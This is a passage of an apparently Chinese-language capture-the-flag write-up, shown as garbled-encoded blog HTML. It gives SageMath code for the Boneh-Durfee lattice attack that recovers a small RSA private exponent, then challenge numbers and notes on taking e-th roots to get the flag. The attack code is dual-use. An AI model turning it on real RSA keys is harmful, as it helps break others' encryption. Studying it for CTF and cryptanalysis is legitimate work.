class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don&#x27;t have a correct </span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this </span></span><br><span class="line"><span class="string">doesn&#x27;t necesseraly mean that no solutions </span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don&#x27;t work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span></span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span>(<span class="params">BB, bound</span>):</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> (a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span></span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let&#x27;s check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vector&quot;</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vectors&quot;</span>, ii, <span class="string">&quot;and&quot;</span>, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;looking for independent vectors in the lattice&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        print( <span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example</span>():</span></span><br><span class="line"></span><br><span class="line">    N = <span class="number">21669699875387343975765484834175962461348837371447024695458479154615348697330944566714587217852888702291368306637977095490953192701450127798670425959768118384915082017373951315699899009631834471691811815393784748930880954114446745814058132752897827717077886547911476575751254872623927783670252969995075629255541621917767501261249192653546875104532649043219697616464205772025267019328364349763854659490144531087349974469079255236823096415094552037488277752927579909539401311624671444833332618177513356173537573280352724384376372955100031534236816681805396608147647003653628203258681097552049114308367967967184116839561</span></span><br><span class="line">    <span class="comment"># the public exponent</span></span><br><span class="line">    e = <span class="number">20717541468269984768938524534679430706714860712589983300712432366828367981392533792814384884126053081363266457682162675931547901815985830455612301105504518353600255693451085179954519939635263372257973143178677586338992274607959326361412487748088349413448526455377296931144384663805056580662706419414607407821761761574754611275621927387380065975844282519447660467416826579669726178901884060454994606177784839804528666823956703141147239309978420776148158425922031573513062568162012505209805669623841355103885621402814626329355281853436655713194649170570579414480803671531927080535374958180810697826214794117466378050607</span></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">.29</span> <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line"><span class="comment">#         m = 4 # size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">        t = <span class="built_in">int</span>((<span class="number">1</span>-<span class="number">2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">        X = <span class="number">2</span>*floor(N^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">        Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>))    <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># Don&#x27;t touch anything below</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Problem put in equation</span></span><br><span class="line">        P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">        A = <span class="built_in">int</span>((N+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">        pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># Find the solutions!</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Checking bounds</span></span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;=== checking values ===&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;* delta:&quot;</span>, delta)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;* delta &lt; 0.292&quot;</span>, delta &lt; <span class="number">0.292</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;* size of e:&quot;</span>, <span class="built_in">int</span>(log(e)/log(<span class="number">2</span>)))</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;* size of N:&quot;</span>, <span class="built_in">int</span>(log(N)/log(<span class="number">2</span>)))</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;* m:&quot;</span>, m, <span class="string">&quot;, t:&quot;</span>, t)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># boneh_durfee</span></span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;=== running algorithm ===&quot;</span>)</span><br><span class="line">            start_time = time.time()</span><br><span class="line"></span><br><span class="line">        solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># found a solution?</span></span><br><span class="line">        <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"></span><br><span class="line">            d = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;private key found:&quot;</span>, d)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;=== no solution was found ===&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            print(<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    example()</span><br></pre></td></tr></table></figure><p>è·‘å‡º<code>d1 =36167461773898995192586226632578677184913220227461899855497899052924496298787 </code></p><p>è§£rsa , æœ‰<code>p = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</code></p><h2 id="æ ¹æ®ä¸Šé¢çš„p-n-è¿˜æœ‰ä¸€äº›eæœ‰å…³çš„æ¡ä»¶-æ±‚flag"><a href="#æ ¹æ®ä¸Šé¢çš„p-n-è¿˜æœ‰ä¸€äº›eæœ‰å…³çš„æ¡ä»¶-æ±‚flag" class="headerlink" title="æ ¹æ®ä¸Šé¢çš„p, n è¿˜æœ‰ä¸€äº›eæœ‰å…³çš„æ¡ä»¶, æ±‚flag"></a>æ ¹æ®ä¸Šé¢çš„p, n è¿˜æœ‰ä¸€äº›eæœ‰å…³çš„æ¡ä»¶, æ±‚flag</h2><p>é€šè¿‡p,nå¾—åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406</span></span><br><span class="line">p = <span class="number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span></span><br><span class="line">q = <span class="number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span></span><br><span class="line">e=</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªeæ˜¯æœªçŸ¥çš„, ä½†æ˜¯<code>assert (e &gt; (ord(&quot;*&quot;)*100) and gcd(e,(p-1)*(q-1))!=1 )</code><br>å¯ä»¥çœ‹åˆ°e&gt;4200è€Œä¸”eä¸phiä¸æ˜¯äº’ç´ çš„â€¦</p><p>é©¬ä¸Šæƒ³åˆ°AMMäº†, ä½†æ˜¯è¿™ä¸ªeä¸çŸ¥é“<br>è¯•è¯•ä»4200å¼€å§‹çˆ†ç ´eâ€¦.ç»“æœAMMå®åœ¨æ˜¯è·‘çš„å¤ªä¹…äº†(ä¹Ÿä¸çŸ¥é“ä¸ºå•¥<br>æ ¹æœ¬æ²¡åŠæ³•å¾€ä¸‹çˆ†â€¦</p><p>æƒ³å›å»çœ‹çœ‹ä¹‹å‰æ‰¾åˆ°AMMçš„é‚£ä¸ªåšå®¢, æƒ³è‡ªå·±é‡æ–°å†™ä¸€ä¸ªæ¥ç€â€¦â€¦<br><a href="http://yulige.top/?p=752#Sore667pt_6solvers">http://yulige.top/?p=752#Sore667pt_6solvers</a> - easyRSA<br>ç„¶åâ€¦å°±å‘ç° æ€ä¹ˆåšå®¢é‚£é“é¢˜çš„på’Œqå’Œè¿™é“é¢˜çš„ä¸€æ¨¡ä¸€æ ·å•Š!<br>ä¼šä¸ä¼šeä¹Ÿæ²¡æ”¹?<br>äºæ˜¯è¯•äº†ä¸€ä¸‹åŸé¢˜çš„e = 0x1337, ç„¶åæŠŠ<del>æ…¢åˆ°æ‰“æŠŠæ¸¸æˆéƒ½è·‘ä¸å®Œçš„</del>ç»„åˆARTæ”¹æˆç›´æ¥éå†mod pä¸‹çš„0x1337æ¬¡æ–¹æ ¹(åªæœ‰flagå¤ŸçŸ­æ‰èƒ½æˆåŠŸ, äº‹å®ä¸Šåšå‡ºç­”æ¡ˆäº†å‘ç°å‡ºé¢˜äººæ˜¯æœ‰åšpaddingçš„, ä½†æ˜¯ä¼¼ä¹è¿˜æ˜¯å¤ªçŸ­äº†?</p><p>ç„¶åå°±ç›´æ¥è·‘å‡ºæ¥äº†â€¦.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span 